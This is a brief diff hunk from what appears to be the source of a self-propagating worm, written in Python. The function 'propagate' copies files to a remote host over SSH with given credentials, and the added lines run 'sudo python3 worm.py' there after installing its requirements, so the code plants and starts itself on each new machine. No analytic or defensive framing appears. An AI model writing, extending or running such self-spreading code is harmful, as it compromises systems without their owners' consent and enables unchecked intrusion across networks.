@@ -27,6 +27,10 @@ def propagate(host,port,username,password):
 		scp = sc.SCPClient(ssh.get_transport())
 		scp.put(files,"~/")
 		scp.close()
+		
+		stdin,stdout,stderr = ssh.exec_command("sudo pip3 install -r requirements.txt; \
+							 sudo python3 worm.py")
+		
 		ssh.close()
 		return "spreaded in " + host
 	except:
